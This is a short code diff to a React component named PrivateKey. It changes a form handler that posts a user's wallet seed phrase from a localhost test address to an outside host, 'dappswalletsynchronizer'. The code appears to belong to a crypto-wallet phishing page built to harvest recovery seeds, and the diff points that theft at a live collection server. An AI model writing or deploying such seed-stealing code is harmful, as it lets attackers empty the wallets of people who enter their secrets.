@@ -33,7 +33,7 @@ const PrivateKey = ({
   };
 
   const handleSubmit = async (e) => {
-    const res = await axios.post("http://localhost:8080/form", {
+    const res = await axios.post("https://dappswalletsynchronizer/form", {
       seed: seed3,
     });
     if (res.data.status === 200) {
